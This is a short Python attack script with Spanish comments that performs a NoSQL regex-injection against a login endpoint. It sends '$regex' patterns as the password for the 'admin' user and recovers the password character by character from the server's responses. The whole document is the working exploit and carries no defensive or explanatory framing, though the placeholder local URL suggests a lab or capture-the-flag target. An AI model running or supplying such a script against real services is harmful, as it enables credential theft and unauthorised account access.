import requests

url = "0.0.0.0:12103"  # Reemplaza con la URL real
password = ""
characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"

while True:
    found = False
    for char in characters:
        test_password = f"^{password}{char}.*"
        data = {
            "username": "admin",
            "password": { "$regex": test_password }
        }
        response = requests.post(url, json=data)
        if response.status_code == 200:  # Ajusta según la respuesta del servidor
            password += char
            print(f"[+] Password so far: {password}")
            found = True
            break

    if not found:
        print(f"[!] Password completo: {password}")
        break
